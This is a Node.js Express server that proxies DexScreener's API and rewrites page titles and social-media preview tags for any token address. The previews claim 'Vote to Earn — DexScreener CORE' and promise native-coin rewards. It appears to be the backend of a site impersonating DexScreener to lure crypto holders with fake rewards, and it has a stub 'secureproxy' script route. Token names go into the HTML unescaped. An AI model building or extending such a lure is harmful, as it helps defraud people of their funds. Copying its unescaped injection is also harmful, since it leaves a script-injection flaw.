const express = require('express');
const fs = require('fs');
const path = require('path');
const https = require('https');

const PORT = process.env.PORT || 3000;
const app = express();

// Serve static files
app.use(express.static(__dirname, { index: false }));

/* ================================
   DEXSCREENER BACKEND PROXY
================================ */

const fetchHeaders = {
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.9'
};

function fetchJson(urlStr) {
    return new Promise((resolve, reject) => {
        const url = new URL(urlStr);
        https.get({
            hostname: url.hostname,
            path: url.pathname + url.search,
            family: 4,
            headers: fetchHeaders
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                if (res.statusCode === 200) {
                    try { resolve(JSON.parse(data)); }
                    catch (e) { reject(e); }
                } else {
                    reject(new Error(`API Status ${res.statusCode}`));
                }
            });
        }).on('error', reject);
    });
}

app.get('/api/token/:ca', async (req, res) => {
    try {
        const data = await fetchJson(
            `https://api.dexscreener.com/latest/dex/tokens/${encodeURIComponent(req.params.ca)}`
        );
        res.json(data);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/api/trending', async (req, res) => {
    try {
        const data = await fetchJson(
            'https://api.dexscreener.com/token-boosts/top/v1'
        );
        res.json(data);
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

/* ================================
   DYNAMIC PREVIEW ENGINE
================================ */

app.get('/*', async (req, res) => {

    let ca = req.params[0] ? req.params[0].replace(/\/$/, '') : '';

    if (ca === 'secureproxy') {
        return res.status(200).type('application/javascript').send('/* ignored */');
    }

    if (ca.match(/\.(js|css|png|jpg|jpeg|svg|ico|json)$/)) {
        return res.status(404).send('Not found');
    }

    let html = fs.readFileSync(path.join(__dirname, 'index.html'), 'utf8');

    /* ======================================
       🔥 CRITICAL FIX — DEFAULT OG IMAGE
    ====================================== */

    const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'https';
    const host = req.get('host');

    const defaultImage = `${protocol}://${host}/images/0_mGS7bBsi5idS5_-o.jpg?v=3`;

    let title = 'DexScreener Votes • Elite Terminal';
    let ogTitle = 'Vote to Earn — DexScreener CORE';
    let ogDesc = '🗳 Vote and earn rewards from the community voting pool';
    let ogImage = defaultImage;
    let twImage = defaultImage;

    /* ======================================
       TOKEN DATA FETCH (SAFE)
    ====================================== */

    if (ca && ca.length > 10 && !ca.includes('/')) {
        try {
            const data = await fetchJson(
                `https://api.dexscreener.com/latest/dex/tokens/${encodeURIComponent(ca)}`
            );

            if (data?.pairs?.length > 0) {

                const pairs = data.pairs.sort(
                    (a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0)
                );

                const pair = pairs[0];
                const token = pair.baseToken;

                const tokenName = token.name || token.symbol || 'Unknown';
                const tokenSymbol = token.symbol || '???';
                const chainId = pair.chainId || 'unknown';

                const chainMap = {
                    solana: 'SOL',
                    ethereum: 'ETH',
                    bsc: 'BNB',
                    polygon: 'MATIC',
                    arbitrum: 'ETH',
                    avalanche: 'AVAX',
                    base: 'ETH',
                    optimism: 'ETH',
                    fantom: 'FTM',
                    cronos: 'CRO',
                    sui: 'SUI',
                    ton: 'TON'
                };

                const rewardSymbol = chainMap[chainId] || chainId.toUpperCase();

                const mcapRaw = pair.fdv || pair.marketCap || 0;

                let mcapStr = '$' + Math.round(mcapRaw);
                if (mcapRaw >= 1e9) mcapStr = '$' + (mcapRaw / 1e9).toFixed(1) + 'B';
                else if (mcapRaw >= 1e6) mcapStr = '$' + (mcapRaw / 1e6).toFixed(1) + 'M';
                else if (mcapRaw >= 1e3) mcapStr = '$' + (mcapRaw / 1e3).toFixed(1) + 'K';

                title = `${tokenName} (${tokenSymbol}) — Vote to Earn ${rewardSymbol}`;
                ogTitle = title;
                ogDesc = `🗳 Vote ${tokenSymbol} and earn ${rewardSymbol}. Market Cap: ${mcapStr}`;

                // Optional: token logo override
                if (token.logoURI && token.logoURI.startsWith('http')) {
                    ogImage = token.logoURI;
                    twImage = token.logoURI;
                }
            }

        } catch (e) {
            console.log('Preview API failed — using default image');
        }
    }

    /* ======================================
       INJECT META TAGS
    ====================================== */

    html = html.replace(/<title>.*?<\/title>/g, `<title>${title}</title>`);

    html = html.replace(/<meta property="og:title".*?>/g,
        `<meta property="og:title" content="${ogTitle}">`);

    html = html.replace(/<meta property="og:description".*?>/g,
        `<meta property="og:description" content="${ogDesc}">`);

    html = html.replace(/<meta property="og:image".*?>/g,
        `<meta property="og:image" content="${ogImage}">
         <meta property="og:image:secure_url" content="${ogImage}">
         <meta property="og:image:type" content="image/jpeg">
         <meta property="og:image:width" content="1200">
         <meta property="og:image:height" content="630">`);

    html = html.replace(/<meta name="twitter:title".*?>/g,
        `<meta name="twitter:title" content="${ogTitle}">`);

    html = html.replace(/<meta name="twitter:description".*?>/g,
        `<meta name="twitter:description" content="${ogDesc}">`);

    html = html.replace(/<meta name="twitter:image".*?>/g,
        `<meta name="twitter:image" content="${twImage}">
         <meta name="twitter:card" content="summary_large_image">`);

    res.send(html);
});

/* ================================
   START SERVER
================================ */

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
